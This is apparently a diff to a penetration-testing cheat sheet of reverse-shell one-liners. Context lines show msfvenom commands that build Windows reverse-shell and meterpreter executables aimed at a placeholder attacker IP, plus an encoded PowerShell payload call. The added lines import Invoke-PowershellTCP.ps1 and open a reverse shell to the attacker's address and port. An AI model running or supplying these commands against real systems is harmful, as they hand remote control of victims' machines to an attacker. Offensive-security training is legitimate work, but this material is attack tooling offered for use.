@@ -33,6 +33,9 @@ $sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient
 > powershell -e base64_payload
 > msfvenom -p windows/shell_reverse_tcp LHOST=<IP-Attacker> LPORT=<Port> -f exe > nameoffile.exe
 > msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP-Attacker> LPORT=<Port> -f exe > nameoffile.exe
+--------------------------------------------------------------------------------------------
+> Import-Module .\Invoke-PowershellTCP.ps1
+> Invoke-PowerShellTcp -Reverse -IPAddress <Our_IP> -Port <Our_Port>
 ````
 
 **Other Languages**
